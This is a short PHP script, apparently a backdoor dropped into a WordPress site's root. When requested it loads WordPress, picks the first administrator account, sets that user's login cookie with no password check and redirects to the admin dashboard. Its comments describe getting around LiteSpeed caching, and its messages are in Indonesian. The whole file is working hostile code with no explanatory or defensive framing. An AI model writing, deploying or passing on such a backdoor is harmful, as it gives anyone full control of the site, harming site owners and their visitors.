<?php
$mr = $_SERVER['DOCUMENT_ROOT'];
@chdir($mr);

if (file_exists('wp-load.php')) {
    include 'wp-load.php';

    $user_query = new WP_User_Query(array(
        'role' => 'Administrator',
        'number' => 1,
        'fields' => 'ID'
    ));

    $results = $user_query->get_results();

    if (isset($results[0])) {
        // Autologin
        wp_set_auth_cookie($results[0], true);
        wp_set_current_user($results[0]);

        // Flush buffer to prevent Litespeed interference
        @ob_clean();
        @flush();

        // Trick Litespeed by using refresh + JS fallback
        $admin_url = admin_url();

        echo "<html><head>
        <meta http-equiv='refresh' content='0;url=$admin_url'>
        <script>window.location.href='$admin_url';</script>
        </head><body>
        <p>Login berhasil, redirect...</p>
        </body></html>";
        exit;
    } else {
        die('NO ADMIN');
    }

} else {
    die('Failed to load');
}
?>
